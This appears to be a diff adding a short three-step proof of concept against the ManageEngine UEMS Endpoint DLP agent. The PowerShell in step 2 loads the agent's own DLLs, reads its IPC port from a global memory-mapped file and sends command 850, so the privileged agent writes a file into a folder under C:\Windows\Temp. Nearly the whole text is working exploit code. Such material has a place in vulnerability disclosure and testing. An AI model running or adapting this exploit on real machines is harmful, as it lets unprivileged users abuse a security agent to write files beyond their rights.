@@ -1,0 +1,19 @@
+Step 1 — "I can't write here":
+echo "test" > C:\Windows\poctest.txt
+
+Step 2 — "But MEDLP can do it for me":
+$bin = 'C:\Program Files (x86)\ManageEngine\UEMS_Agent\EndpointDLP\bin'
+[void][Reflection.Assembly]::LoadFrom("$bin\AsyncIO.dll")
+[void][Reflection.Assembly]::LoadFrom("$bin\NetMQ.dll")
+$map = [IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting('Global\{37669676-A539-4FAF-BB0E-FBCE2F90B099}')
+$view = $map.CreateViewAccessor(); $port = $view.ReadInt32(0); $view.Dispose(); $map.Dispose()
+$asm = [Reflection.Assembly]::LoadFrom("$bin\DotNetUI.dll")
+$type = $asm.GetType('AgentUtil.DuplexClient', $true)
+$client = [Activator]::CreateInstance($type)
+$type.GetMethod('Initialize').Invoke($client, @([int]$port))
+$method = $type.GetMethod('SendWithPoller', [Type[]]@([int], [string], [byte[]].MakeByRefType(), [long]))
+$ok = $method.Invoke($client, [object[]]@(850, '{"ShadowFolder":"C:\\Windows\\Temp\\UEMS-MEDLP-CMD850\\","TotalPages":1}', $null, [long]10000))
+Write-Host "Command850Success=$ok"
+
+Step 3 — "Now the file is there":
+dir C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf
